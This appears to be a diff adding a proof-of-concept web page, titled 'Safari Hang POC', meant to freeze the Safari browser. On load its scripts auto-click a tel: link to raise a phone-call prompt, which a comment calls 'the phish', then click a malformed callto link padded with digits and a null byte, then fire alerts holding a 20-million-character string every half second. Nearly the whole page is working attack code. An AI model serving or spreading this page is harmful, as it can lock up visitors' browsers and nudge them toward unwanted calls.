@@ -1,0 +1,51 @@
+<html>
+
+<head>
+	<title>
+		Safari Hang POC
+	</title>
+</head>
+
+<body>
+
+<h1>Safari Hang POC</h1>
+
+<p>
+You should recieve a request to call a phone number. After clicking cancel, Safari will be completely unresponsive.
+</p>
+
+<!-- This is the target element -->
+<p id="result"></p>
+
+<!-- This initially sets up the phish -->
+<script type="text/javascript">
+
+jQuery('#result').append('<a href="tel:Safari Hang POC"></a>');
+document.querySelector('a').click();
+
+</script>
+
+<!-- This is the code that causes Safari to hang -->
+<script type="text/javascript">
+
+var extraData = "";
+for (iterate = 0; iterate < 10; iterate++) {
+	var extraData = extraData + "5555555555";
+}
+
+jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+document.querySelector('a').click();
+document.querySelector('a').click();
+
+</script>
+
+<!-- This is also somehow involved -->
+<script type="text/javascript">
+
+setInterval(function(){ alert('\0345'.repeat(20000000));}, 500);
+
+</script>
+
+</body>
+
+</html>
